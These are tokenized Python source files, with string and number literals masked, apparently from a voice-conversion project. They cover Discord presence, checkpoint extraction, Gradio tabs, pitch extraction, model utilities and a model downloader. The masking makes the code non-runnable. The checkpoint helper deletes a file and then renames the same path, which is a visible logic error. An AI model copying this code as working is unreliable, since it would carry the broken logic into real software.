<EOL> for _ in range ( <NUM_LIT> ) : <EOL> options . append ( <EOL> f"<STR_LIT>" <EOL> ) <EOL> else : <EOL> for _ in range ( <NUM_LIT> ) : <EOL> options . append ( <EOL> f"<STR_LIT>" <EOL> ) <EOL> shuffle ( options ) <EOL> with open ( f"<STR_LIT>" , "<STR_LIT>" ) as f : <EOL> f . write ( "<STR_LIT>" . join ( options ) ) <EOL> </s>
<s> from pypresence import Presence <EOL> import datetime as dt <EOL> import time <EOL> class RichPresenceManager : <EOL> def __init__ ( self ) : <EOL> self . client_id = "<STR_LIT>" <EOL> self . rpc = None <EOL> self . running = False <EOL> def start_presence ( self ) : <EOL> if not self . running : <EOL> self . running = True <EOL> self . rpc = Presence ( self . client_id ) <EOL> try : <EOL> self . rpc . connect ( ) <EOL> self . update_presence ( ) <EOL> except KeyboardInterrupt as error : <EOL> print ( error ) <EOL> self . rpc = None <EOL> self . running = False <EOL> except Exception as e : <EOL> print ( f"<STR_LIT>" ) <EOL> self . rpc = None <EOL> self . running = False <EOL> def update_presence ( self ) : <EOL> if self . rpc : <EOL> self . rpc . update ( <EOL> state = "<STR_LIT>" , <EOL> details = "<STR_LIT>" , <EOL> buttons = [ <EOL> { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : "<STR_LIT>" } , <EOL> { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : "<STR_LIT>" } , <EOL> ] , <EOL> large_image = "<STR_LIT>" , <EOL> large_text = "<STR_LIT>" , <EOL> start = dt . datetime . now ( ) . timestamp ( ) , <EOL> ) <EOL> def stop_presence ( self ) : <EOL> self . running = False <EOL> if self . rpc : <EOL> self . rpc . close ( ) <EOL> self . rpc = None <EOL> RPCManager = RichPresenceManager ( ) <EOL> </s>
<s> import os <EOL> import torch <EOL> import hashlib <EOL> import datetime <EOL> from collections import OrderedDict <EOL> def replace_keys_in_dict ( d , old_key_part , new_key_part ) : <EOL> if isinstance ( d , OrderedDict ) : <EOL> updated_dict = OrderedDict ( ) <EOL> else : <EOL> updated_dict = { } <EOL> for key , value in d . items ( ) : <EOL> new_key = key . replace ( old_key_part , new_key_part ) <EOL> if isinstance ( value , dict ) : <EOL> value = replace_keys_in_dict ( value , old_key_part , new_key_part ) <EOL> updated_dict [ new_key ] = value <EOL> return updated_dict <EOL> def extract_small_model ( path , name , sr , if_f0 , version , epoch , step ) : <EOL> try : <EOL> ckpt = torch . load ( path , map_location = "<STR_LIT>" ) <EOL> pth_file = f"<STR_LIT>" <EOL> pth_file_old_version_path = os . path . join ( "<STR_LIT>" , f"<STR_LIT>" ) <EOL> opt = OrderedDict ( <EOL> weight = { <EOL> key : value . half ( ) for key , value in ckpt . items ( ) if "<STR_LIT>" not in key <EOL> } <EOL> ) <EOL> if "<STR_LIT>" in ckpt : <EOL> ckpt = ckpt [ "<STR_LIT>" ] <EOL> opt = OrderedDict ( ) <EOL> opt [ "<STR_LIT>" ] = { } <EOL> for key in ckpt . keys ( ) : <EOL> if "<STR_LIT>" in key : <EOL> continue <EOL> opt [ "<STR_LIT>" ] [ key ] = ckpt [ key ] . half ( ) <EOL> if sr == "<STR_LIT>" : <EOL> opt [ "<STR_LIT>" ] = [ <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> "<STR_LIT>" , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> [ [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] ] , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> <NUM_LIT> , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> ] <EOL> elif sr == "<STR_LIT>" : <EOL> if version == "<STR_LIT>" : <EOL> opt [ "<STR_LIT>" ] = [ <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> "<STR_LIT>" , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> [ [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] ] , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> <NUM_LIT> , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> ] <EOL> else : <EOL> opt [ "<STR_LIT>" ] = [ <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> "<STR_LIT>" , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> [ [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] ] , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> <NUM_LIT> , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> ] <EOL> elif sr == "<STR_LIT>" : <EOL> if version == "<STR_LIT>" : <EOL> opt [ "<STR_LIT>" ] = [ <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> "<STR_LIT>" , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> [ [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] ] , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> <NUM_LIT> , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> ] <EOL> else : <EOL> opt [ "<STR_LIT>" ] = [ <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> "<STR_LIT>" , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> [ [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] ] , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> <NUM_LIT> , <EOL> [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> <NUM_LIT> , <EOL> ] <EOL> opt [ "<STR_LIT>" ] = epoch <EOL> opt [ "<STR_LIT>" ] = step <EOL> opt [ "<STR_LIT>" ] = sr <EOL> opt [ "<STR_LIT>" ] = int ( if_f0 ) <EOL> opt [ "<STR_LIT>" ] = version <EOL> opt [ "<STR_LIT>" ] = datetime . datetime . now ( ) . isoformat ( ) <EOL> hash_input = f"<STR_LIT>" <EOL> model_hash = hashlib . sha256 ( hash_input . encode ( ) ) . hexdigest ( ) <EOL> opt [ "<STR_LIT>" ] = model_hash <EOL> model = torch . load ( pth_file_old_version_path , map_location = torch . device ( "<STR_LIT>" ) ) <EOL> torch . save ( <EOL> replace_keys_in_dict ( <EOL> replace_keys_in_dict ( <EOL> model , "<STR_LIT>" , "<STR_LIT>" <EOL> ) , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ) , <EOL> pth_file_old_version_path , <EOL> ) <EOL> os . remove ( pth_file_old_version_path ) <EOL> os . rename ( pth_file_old_version_path , pth_file ) <EOL> except Exception as error : <EOL> print ( error ) <EOL> </s>
<s> import os <EOL> import sys <EOL> import base64 <EOL> import pathlib <EOL> import tempfile <EOL> import gradio as gr <EOL> from assets . i18n . i18n import I18nAuto <EOL> import assets . themes . loadThemes as loadThemes <EOL> now_dir = os . getcwd ( ) <EOL> sys . path . append ( now_dir ) <EOL> i18n = I18nAuto ( ) <EOL> def theme_tab ( ) : <EOL> with gr . Row ( ) : <EOL> with gr . Column ( ) : <EOL> themes_select = gr . Dropdown ( <EOL> loadThemes . get_list ( ) , <EOL> value = loadThemes . read_json ( ) , <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> visible = True , <EOL> ) <EOL> themes_select . change ( <EOL> fn = loadThemes . select_theme , <EOL> inputs = themes_select , <EOL> outputs = [ ] , <EOL> ) <EOL> </s>
<s> import os <EOL> import sys <EOL> import gradio as gr <EOL> import json <EOL> from assets . i18n . i18n import I18nAuto <EOL> from assets . discord_presence import RPCManager <EOL> now_dir = os . getcwd ( ) <EOL> sys . path . append ( now_dir ) <EOL> i18n = I18nAuto ( ) <EOL> config_file = os . path . join ( now_dir , "<STR_LIT>" , "<STR_LIT>" ) <EOL> def load_config_presence ( ) : <EOL> with open ( config_file , "<STR_LIT>" , encoding = "<STR_LIT>" ) as file : <EOL> config = json . load ( file ) <EOL> return config [ "<STR_LIT>" ] <EOL> def save_config ( value ) : <EOL> with open ( config_file , "<STR_LIT>" , encoding = "<STR_LIT>" ) as file : <EOL> config = json . load ( file ) <EOL> config [ "<STR_LIT>" ] = value <EOL> with open ( config_file , "<STR_LIT>" , encoding = "<STR_LIT>" ) as file : <EOL> json . dump ( config , file , indent = <NUM_LIT> ) <EOL> def presence_tab ( ) : <EOL> with gr . Row ( ) : <EOL> with gr . Column ( ) : <EOL> presence = gr . Checkbox ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> interactive = True , <EOL> value = load_config_presence ( ) , <EOL> ) <EOL> presence . change ( <EOL> fn = toggle , <EOL> inputs = [ presence ] , <EOL> outputs = [ ] , <EOL> ) <EOL> def toggle ( checkbox ) : <EOL> save_config ( bool ( checkbox ) ) <EOL> if load_config_presence ( ) == True : <EOL> try : <EOL> RPCManager . start_presence ( ) <EOL> except KeyboardInterrupt : <EOL> RPCManager . stop_presence ( ) <EOL> else : <EOL> RPCManager . stop_presence ( ) <EOL> </s>
<s> import os <EOL> import sys <EOL> import numpy as np <EOL> import pyworld <EOL> import torchcrepe <EOL> import torch <EOL> import parselmouth <EOL> import tqdm <EOL> from multiprocessing import Process , cpu_count <EOL> current_directory = os . getcwd ( ) <EOL> sys . path . append ( current_directory ) <EOL> from rvc . lib . utils import load_audio <EOL> exp_dir = sys . argv [ <NUM_LIT> ] <EOL> f0_method = sys . argv [ <NUM_LIT> ] <EOL> num_processes = cpu_count ( ) <EOL> try : <EOL> hop_length = int ( sys . argv [ <NUM_LIT> ] ) <EOL> except ValueError : <EOL> hop_length = <NUM_LIT> <EOL> DoFormant = False <EOL> Quefrency = <NUM_LIT> <EOL> Timbre = <NUM_LIT> <EOL> class FeatureInput : <EOL> def __init__ ( self , sample_rate = <NUM_LIT> , hop_size = <NUM_LIT> ) : <EOL> self . fs = sample_rate <EOL> self . hop = hop_size <EOL> self . f0_method_dict = self . get_f0_method_dict ( ) <EOL> self . f0_bin = <NUM_LIT> <EOL> self . f0_max = <NUM_LIT> <EOL> self . f0_min = <NUM_LIT> <EOL> self . f0_mel_min = <NUM_LIT> * np . log ( <NUM_LIT> + self . f0_min / <NUM_LIT> ) <EOL> self . f0_mel_max = <NUM_LIT> * np . log ( <NUM_LIT> + self . f0_max / <NUM_LIT> ) <EOL> def mncrepe ( self , method , x , p_len , hop_length ) : <EOL> f0 = None <EOL> torch_device_index = <NUM_LIT> <EOL> torch_device = ( <EOL> torch . device ( f"<STR_LIT>" ) <EOL> if torch . cuda . is_available ( ) <EOL> else ( <EOL> torch . device ( "<STR_LIT>" ) <EOL> if torch . backends . mps . is_available ( ) <EOL> else torch . device ( "<STR_LIT>" ) <EOL> ) <EOL> ) <EOL> audio = torch . from_numpy ( x . astype ( np . float32 ) ) . to ( torch_device , copy = True ) <EOL> audio /= torch . quantile ( torch . abs ( audio ) , <NUM_LIT> ) <EOL> audio = torch . unsqueeze ( audio , dim = <NUM_LIT> ) <EOL> if audio . ndim == <NUM_LIT> and audio . shape [ <NUM_LIT> ] > <NUM_LIT> : <EOL> audio = torch . mean ( audio , dim = <NUM_LIT> , keepdim = True ) . detach ( ) <EOL> audio = audio . detach ( ) <EOL> if method == "<STR_LIT>" : <EOL> pitch = torchcrepe . predict ( <EOL> audio , <EOL> self . fs , <EOL> hop_length , <EOL> self . f0_min , <EOL> self . f0_max , <EOL> "<STR_LIT>" , <EOL> batch_size = hop_length * <NUM_LIT> , <EOL> device = torch_device , <EOL> pad = True , <EOL> ) <EOL> p_len = p_len or x . shape [ <NUM_LIT> ] // hop_length <EOL> source = np . array ( pitch . squeeze ( <NUM_LIT> ) . cpu ( ) . float ( ) . numpy ( ) ) <EOL> source [ source < <NUM_LIT> ] = np . nan <EOL> target = np . interp ( <EOL> np . arange ( <NUM_LIT> , len ( source ) * p_len , len ( source ) ) / p_len , <EOL> np . arange ( <NUM_LIT> , len ( source ) ) , <EOL> source , <EOL> ) <EOL> f0 = np . nan_to_num ( target ) <EOL> return f0 <EOL> def get_pm ( self , x , p_len ) : <EOL> f0 = ( <EOL> parselmouth . Sound ( x , self . fs ) <EOL> . to_pitch_ac ( <EOL> time_step = <NUM_LIT> / <NUM_LIT> , <EOL> voicing_threshold = <NUM_LIT> , <EOL> pitch_floor = self . f0_min , <EOL> pitch_ceiling = self . f0_max , <EOL> ) <EOL> . selected_array [ "<STR_LIT>" ] <EOL> ) <EOL> return np . pad ( <EOL> f0 , <EOL> [ <EOL> [ <EOL> max ( <NUM_LIT> , ( p_len - len ( f0 ) + <NUM_LIT> ) // <NUM_LIT> ) , <EOL> max ( <NUM_LIT> , p_len - len ( f0 ) - ( p_len - len ( f0 ) + <NUM_LIT> ) // <NUM_LIT> ) , <EOL> ] <EOL> ] , <EOL> mode = "<STR_LIT>" , <EOL> ) <EOL> def get_harvest ( self , x ) : <EOL> f0_spectral = pyworld . harvest ( <EOL> x . astype ( np . double ) , <EOL> fs = self . fs , <EOL> f0_ceil = self . f0_max , <EOL> f0_floor = self . f0_min , <EOL> frame_period = <NUM_LIT> * self . hop / self . fs , <EOL> ) <EOL> return pyworld . stonemask ( x . astype ( np . double ) , * f0_spectral , self . fs ) <EOL> def get_dio ( self , x ) : <EOL> f0_spectral = pyworld . dio ( <EOL> x . astype ( np . double ) , <EOL> fs = self . fs , <EOL> f0_ceil = self . f0_max , <EOL> f0_floor = self . f0_min , <EOL> frame_period = <NUM_LIT> * self . hop / self . fs , <EOL> ) <EOL> return pyworld . stonemask ( x . astype ( np . double ) , * f0_spectral , self . fs ) <EOL> def get_rmvpe ( self , x ) : <EOL> if not hasattr ( self , "<STR_LIT>" ) : <EOL> from rvc . lib . rmvpe import RMVPE <EOL> self . model_rmvpe = RMVPE ( "<STR_LIT>" , is_half = False , device = "<STR_LIT>" ) <EOL> return self . model_rmvpe . infer_from_audio ( x , thred = <NUM_LIT> ) <EOL> def get_f0_method_dict ( self ) : <EOL> return { <EOL> "<STR_LIT>" : self . get_pm , <EOL> "<STR_LIT>" : self . get_harvest , <EOL> "<STR_LIT>" : self . get_dio , <EOL> "<STR_LIT>" : self . get_rmvpe , <EOL> } <EOL> def compute_f0 ( self , path , f0_method , hop_length ) : <EOL> x = load_audio ( path , self . fs ) <EOL> p_len = x . shape [ <NUM_LIT> ] // self . hop <EOL> if f0_method in self . f0_method_dict : <EOL> f0 = ( <EOL> self . f0_method_dict [ f0_method ] ( x , p_len ) <EOL> if f0_method == "<STR_LIT>" <EOL> else self . f0_method_dict [ f0_method ] ( x ) <EOL> ) <EOL> elif f0_method == "<STR_LIT>" : <EOL> f0 = self . mncrepe ( f0_method , x , p_len , hop_length ) <EOL> return f0 <EOL> def coarse_f0 ( self , f0 ) : <EOL> f0_mel = <NUM_LIT> * np . log ( <NUM_LIT> + f0 / <NUM_LIT> ) <EOL> f0_mel [ f0_mel > <NUM_LIT> ] = ( f0_mel [ f0_mel > <NUM_LIT> ] - self . f0_mel_min ) * ( <EOL> self . f0_bin - <NUM_LIT> <EOL> ) / ( self . f0_mel_max - self . f0_mel_min ) + <NUM_LIT> <EOL> f0_mel [ f0_mel <= <NUM_LIT> ] = <NUM_LIT> <EOL> f0_mel [ f0_mel > self . f0_bin - <NUM_LIT> ] = self . f0_bin - <NUM_LIT> <EOL> f0_coarse = np . rint ( f0_mel ) . astype ( int ) <EOL> assert f0_coarse . max ( ) <= <NUM_LIT> and f0_coarse . min ( ) >= <NUM_LIT> , ( <EOL> f0_coarse . max ( ) , <EOL> f0_coarse . min ( ) , <EOL> ) <EOL> return f0_coarse <EOL> def process_paths ( self , paths , f0_method , hop_length , thread_n ) : <EOL> if len ( paths ) == <NUM_LIT> : <EOL> print ( "<STR_LIT>" ) <EOL> return <EOL> with tqdm . tqdm ( total = len ( paths ) , leave = True , position = thread_n ) as pbar : <EOL> description = f"<STR_LIT>" <EOL> pbar . set_description ( description ) <EOL> for idx , ( inp_path , opt_path1 , opt_path2 ) in enumerate ( paths ) : <EOL> try : <EOL> if os . path . exists ( opt_path1 + "<STR_LIT>" ) and os . path . exists ( <EOL> opt_path2 + "<STR_LIT>" <EOL> ) : <EOL> pbar . update ( <NUM_LIT> ) <EOL> continue <EOL> feature_pit = self . compute_f0 ( inp_path , f0_method , hop_length ) <EOL> np . save ( <EOL> opt_path2 , <EOL> feature_pit , <EOL> allow_pickle = False , <EOL> ) <EOL> coarse_pit = self . coarse_f0 ( feature_pit ) <EOL> np . save ( <EOL> opt_path1 , <EOL> coarse_pit , <EOL> allow_pickle = False , <EOL> ) <EOL> pbar . update ( <NUM_LIT> ) <EOL> except Exception as error : <EOL> print ( f"<STR_LIT>" ) <EOL> if __name__ == "<STR_LIT>" : <EOL> feature_input = FeatureInput ( ) <EOL> paths = [ ] <EOL> input_root = f"<STR_LIT>" <EOL> output_root1 = f"<STR_LIT>" <EOL> output_root2 = f"<STR_LIT>" <EOL> os . makedirs ( output_root1 , exist_ok = True ) <EOL> os . makedirs ( output_root2 , exist_ok = True ) <EOL> for name in sorted ( list ( os . listdir ( input_root ) ) ) : <EOL> input_path = f"<STR_LIT>" <EOL> if "<STR_LIT>" in input_path : <EOL> continue <EOL> output_path1 = f"<STR_LIT>" <EOL> output_path2 = f"<STR_LIT>" <EOL> paths . append ( [ input_path , output_path1 , output_path2 ] ) <EOL> processes = [ ] <EOL> print ( "<STR_LIT>" + f0_method ) <EOL> for i in range ( num_processes ) : <EOL> p = Process ( <EOL> target = feature_input . process_paths , <EOL> args = ( paths [ i : : num_processes ] , f0_method , hop_length , i ) , <EOL> ) <EOL> processes . append ( p ) <EOL> p . start ( ) <EOL> for i in range ( num_processes ) : <EOL> processes [ i ] . join ( ) <EOL> </s>
<s> import math <EOL> import numpy as np <EOL> import torch <EOL> from torch import nn <EOL> from torch . nn import functional as F <EOL> def init_weights ( m , mean = <NUM_LIT> , std = <NUM_LIT> ) : <EOL> classname = m . __class__ . __name__ <EOL> if classname . find ( "<STR_LIT>" ) != - <NUM_LIT> : <EOL> m . weight . data . normal_ ( mean , std ) <EOL> def get_padding ( kernel_size , dilation = <NUM_LIT> ) : <EOL> return int ( ( kernel_size * dilation - dilation ) / <NUM_LIT> ) <EOL> def convert_pad_shape ( pad_shape ) : <EOL> l = pad_shape [ : : - <NUM_LIT> ] <EOL> pad_shape = [ item for sublist in l for item in sublist ] <EOL> return pad_shape <EOL> def kl_divergence ( m_p , logs_p , m_q , logs_q ) : <EOL> kl = ( logs_q - logs_p ) - <NUM_LIT> <EOL> kl += ( <EOL> <NUM_LIT> * ( torch . exp ( <NUM_LIT> * logs_p ) + ( ( m_p - m_q ) ** <NUM_LIT> ) ) * torch . exp ( - <NUM_LIT> * logs_q ) <EOL> ) <EOL> return kl <EOL> def rand_gumbel ( shape ) : <EOL> uniform_samples = torch . rand ( shape ) * <NUM_LIT> + <NUM_LIT> <EOL> return - torch . log ( - torch . log ( uniform_samples ) ) <EOL> def rand_gumbel_like ( x ) : <EOL> g = rand_gumbel ( x . size ( ) ) . to ( dtype = x . dtype , device = x . device ) <EOL> return g <EOL> def slice_segments ( x , ids_str , segment_size = <NUM_LIT> ) : <EOL> ret = torch . zeros_like ( x [ : , : , : segment_size ] ) <EOL> for i in range ( x . size ( <NUM_LIT> ) ) : <EOL> idx_str = ids_str [ i ] <EOL> idx_end = idx_str + segment_size <EOL> ret [ i ] = x [ i , : , idx_str : idx_end ] <EOL> return ret <EOL> def slice_segments2 ( x , ids_str , segment_size = <NUM_LIT> ) : <EOL> ret = torch . zeros_like ( x [ : , : segment_size ] ) <EOL> for i in range ( x . size ( <NUM_LIT> ) ) : <EOL> idx_str = ids_str [ i ] <EOL> idx_end = idx_str + segment_size <EOL> ret [ i ] = x [ i , idx_str : idx_end ] <EOL> return ret <EOL> def rand_slice_segments ( x , x_lengths = None , segment_size = <NUM_LIT> ) : <EOL> b , d , t = x . size ( ) <EOL> if x_lengths is None : <EOL> x_lengths = t <EOL> ids_str_max = x_lengths - segment_size + <NUM_LIT> <EOL> ids_str = ( torch . rand ( [ b ] ) . to ( device = x . device ) * ids_str_max ) . to ( dtype = torch . long ) <EOL> ret = slice_segments ( x , ids_str , segment_size ) <EOL> return ret , ids_str <EOL> def get_timing_signal_1d ( length , channels , min_timescale = <NUM_LIT> , max_timescale = <NUM_LIT> ) : <EOL> position = torch . arange ( length , dtype = torch . float ) <EOL> num_timescales = channels // <NUM_LIT> <EOL> log_timescale_increment = math . log ( float ( max_timescale ) / float ( min_timescale ) ) / ( <EOL> num_timescales - <NUM_LIT> <EOL> ) <EOL> inv_timescales = min_timescale * torch . exp ( <EOL> torch . arange ( num_timescales , dtype = torch . float ) * - log_timescale_increment <EOL> ) <EOL> scaled_time = position . unsqueeze ( <NUM_LIT> ) * inv_timescales . unsqueeze ( <NUM_LIT> ) <EOL> signal = torch . cat ( [ torch . sin ( scaled_time ) , torch . cos ( scaled_time ) ] , <NUM_LIT> ) <EOL> signal = F . pad ( signal , [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , channels % <NUM_LIT> ] ) <EOL> signal = signal . view ( <NUM_LIT> , channels , length ) <EOL> return signal <EOL> def add_timing_signal_1d ( x , min_timescale = <NUM_LIT> , max_timescale = <NUM_LIT> ) : <EOL> b , channels , length = x . size ( ) <EOL> signal = get_timing_signal_1d ( length , channels , min_timescale , max_timescale ) <EOL> return x + signal . to ( dtype = x . dtype , device = x . device ) <EOL> def cat_timing_signal_1d ( x , min_timescale = <NUM_LIT> , max_timescale = <NUM_LIT> , axis = <NUM_LIT> ) : <EOL> b , channels , length = x . size ( ) <EOL> signal = get_timing_signal_1d ( length , channels , min_timescale , max_timescale ) <EOL> return torch . cat ( [ x , signal . to ( dtype = x . dtype , device = x . device ) ] , axis ) <EOL> def subsequent_mask ( length ) : <EOL> mask = torch . tril ( torch . ones ( length , length ) ) . unsqueeze ( <NUM_LIT> ) . unsqueeze ( <NUM_LIT> ) <EOL> return mask <EOL> @ torch . jit . script <EOL> def fused_add_tanh_sigmoid_multiply ( input_a , input_b , n_channels ) : <EOL> n_channels_int = n_channels [ <NUM_LIT> ] <EOL> in_act = input_a + input_b <EOL> t_act = torch . tanh ( in_act [ : , : n_channels_int , : ] ) <EOL> s_act = torch . sigmoid ( in_act [ : , n_channels_int : , : ] ) <EOL> acts = t_act * s_act <EOL> return acts <EOL> def convert_pad_shape ( pad_shape ) : <EOL> l = pad_shape [ : : - <NUM_LIT> ] <EOL> pad_shape = [ item for sublist in l for item in sublist ] <EOL> return pad_shape <EOL> def shift_1d ( x ) : <EOL> x = F . pad ( x , convert_pad_shape ( [ [ <NUM_LIT> , <NUM_LIT> ] , [ <NUM_LIT> , <NUM_LIT> ] , [ <NUM_LIT> , <NUM_LIT> ] ] ) ) [ : , : , : - <NUM_LIT> ] <EOL> return x <EOL> def sequence_mask ( length , max_length = None ) : <EOL> if max_length is None : <EOL> max_length = length . max ( ) <EOL> x = torch . arange ( max_length , dtype = length . dtype , device = length . device ) <EOL> return x . unsqueeze ( <NUM_LIT> ) < length . unsqueeze ( <NUM_LIT> ) <EOL> def generate_path ( duration , mask ) : <EOL> device = duration . device <EOL> b , _ , t_y , t_x = mask . shape <EOL> cum_duration = torch . cumsum ( duration , - <NUM_LIT> ) <EOL> cum_duration_flat = cum_duration . view ( b * t_x ) <EOL> path = sequence_mask ( cum_duration_flat , t_y ) . to ( mask . dtype ) <EOL> path = path . view ( b , t_x , t_y ) <EOL> path = path - F . pad ( path , convert_pad_shape ( [ [ <NUM_LIT> , <NUM_LIT> ] , [ <NUM_LIT> , <NUM_LIT> ] , [ <NUM_LIT> , <NUM_LIT> ] ] ) ) [ : , : - <NUM_LIT> ] <EOL> path = path . unsqueeze ( <NUM_LIT> ) . transpose ( <NUM_LIT> , <NUM_LIT> ) * mask <EOL> return path <EOL> def clip_grad_value_ ( parameters , clip_value , norm_type = <NUM_LIT> ) : <EOL> if isinstance ( parameters , torch . Tensor ) : <EOL> parameters = [ parameters ] <EOL> parameters = list ( filter ( lambda p : p . grad is not None , parameters ) ) <EOL> norm_type = float ( norm_type ) <EOL> if clip_value is not None : <EOL> clip_value = float ( clip_value ) <EOL> total_norm = <NUM_LIT> <EOL> for p in parameters : <EOL> param_norm = p . grad . data . norm ( norm_type ) <EOL> total_norm += param_norm . item ( ) ** norm_type <EOL> if clip_value is not None : <EOL> p . grad . data . clamp_ ( min = - clip_value , max = clip_value ) <EOL> total_norm = total_norm ** ( <NUM_LIT> / norm_type ) <EOL> return total_norm <EOL> </s>
<s> import os <EOL> import wget <EOL> url_base = "<STR_LIT>" <EOL> pretraineds_v1_list = [ <EOL> ( <EOL> "<STR_LIT>" , <EOL> [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] , <EOL> ) , <EOL> ] <EOL> pretraineds_v2_list = [ <EOL> ( <EOL> "<STR_LIT>" , <EOL> [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] , <EOL> ) , <EOL> ] <EOL> models_list = [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> executables_list = [ "<STR_LIT>" , "<STR_LIT>" ] <EOL> folder_mapping_list = { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> } <EOL> def prequisites_download_pipeline ( pretraineds_v1 , pretraineds_v2 , models , exe ) : <EOL> def download_files ( file_list ) : <EOL> for file_name in file_list : <EOL> destination_path = os . path . join ( file_name ) <EOL> url = f"<STR_LIT>" <EOL> if not os . path . exists ( destination_path ) : <EOL> os . makedirs ( os . path . dirname ( destination_path ) or "<STR_LIT>" , exist_ok = True ) <EOL> print ( f"<STR_LIT>" ) <EOL> wget . download ( url , out = destination_path ) <EOL> if models == "<STR_LIT>" : <EOL> download_files ( models_list ) <EOL> if exe == "<STR_LIT>" and os . name == "<STR_LIT>" : <EOL> download_files ( executables_list ) <EOL> if pretraineds_v1 == "<STR_LIT>" : <EOL> for remote_folder , file_list in pretraineds_v1_list : <EOL> local_folder = folder_mapping_list . get ( remote_folder , "<STR_LIT>" ) <EOL> for file in file_list : <EOL> destination_path = os . path . join ( local_folder , file ) <EOL> url = f"<STR_LIT>" <EOL> if not os . path . exists ( destination_path ) : 